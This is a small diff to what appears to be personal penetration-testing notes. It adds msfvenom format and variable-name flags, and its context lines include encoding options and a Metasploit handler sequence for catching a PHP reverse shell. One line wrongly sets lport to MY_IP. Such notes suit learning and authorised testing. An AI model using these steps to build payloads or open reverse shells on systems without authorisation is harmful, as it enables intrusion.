@@ -3,6 +3,8 @@
 `msfvenom --list formats`
 
 `-e ENCODING -b"\x00...BYTES_TO_FILTER"
+`-f FORMAT` : elf, exe, raw, python 
+`-v VAR_NAME` : useful to set a variable name for script code (like with `-f python`)
 
 #### Handlers
 `use exploit/multi/handler` -> `set payload php/reverse_php` *(optional) omit for meterpreter shell*-\> `set lhost MY_IP` -\> `set lport MY_IP` -\> `run` *infers listener running*
